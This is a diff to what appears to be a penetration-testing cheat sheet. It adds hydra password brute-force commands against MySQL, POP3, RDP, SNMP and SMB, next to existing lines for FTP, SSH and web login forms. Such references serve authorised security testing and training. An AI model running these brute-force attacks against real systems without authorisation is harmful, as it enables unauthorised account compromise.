@@ -190,6 +190,12 @@ Enable or disable protocols, ciphers, hashes and key exchange algorithms on Wind
 - hydra -l username ftp://xxxxxxxxx -P /usr/share/wordlists/rockyou.txt   
 - hydra -l username -v -V -P /usr/share/wordlists/rockyou.txt xxx.xx.xx.xx ssh
 
+ #### other
+- hydra -L usernames.txt -P pass.txt <IP> mysql
+- hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
+- hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
+- hydra -P common-snmp-community-strings.txt target.com snmp
+- hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 #### web
 - hydra -l <username> -P <wordlist> xxx.xxx.xx.xx http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
  - http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
